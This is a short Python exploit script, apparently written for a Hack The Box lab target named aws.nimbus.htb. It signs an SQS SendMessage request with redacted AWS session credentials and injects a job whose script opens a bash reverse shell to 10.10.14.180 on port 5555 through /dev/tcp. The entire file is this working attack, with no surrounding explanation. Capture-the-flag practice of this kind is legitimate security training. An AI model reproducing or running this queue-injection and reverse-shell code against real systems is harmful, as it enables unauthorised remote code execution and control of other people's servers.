import requests
import urllib.parse
from botocore.awsrequest import AWSRequest
from botocore.auth import SigV4Auth
from botocore.credentials import Credentials

ACCESS_KEY = "<REDACTED>"
SECRET_KEY = "<REDACTED>"
SESSION_TOKEN = ("<REDACTED_SESSION_TOKEN>")

creds = Credentials(ACCESS_KEY, SECRET_KEY, SESSION_TOKEN)
ENDPOINT = "http://aws.nimbus.htb"
QUEUE_URL = f"{ENDPOINT}/<REDACTED_ACCOUNT_ID>/nimbus-jobs"

message_body = (
    "name: pwn\n"
    "script: |\n"
    "  import subprocess\n"
    "  subprocess.call(['bash','-c','bash -i >& /dev/tcp/10.10.14.180/5555 0>&1'])\n"
)

body = "Action=SendMessage&Version=2012-11-05" \
       "&QueueUrl=" + urllib.parse.quote(QUEUE_URL, safe="") + \
       "&MessageBody=" + urllib.parse.quote(message_body, safe="")

req = AWSRequest(method="POST", url=ENDPOINT + "/", data=body,
                  headers={"Content-Type": "application/x-www-form-urlencoded"})
SigV4Auth(creds, "sqs", "us-east-1").add_auth(req)
prepared = req.prepare()

r = requests.post(prepared.url, headers=dict(prepared.headers), data=prepared.body, timeout=15)
print("STATUS:", r.status_code)
print("BODY:", r.text[:1500])
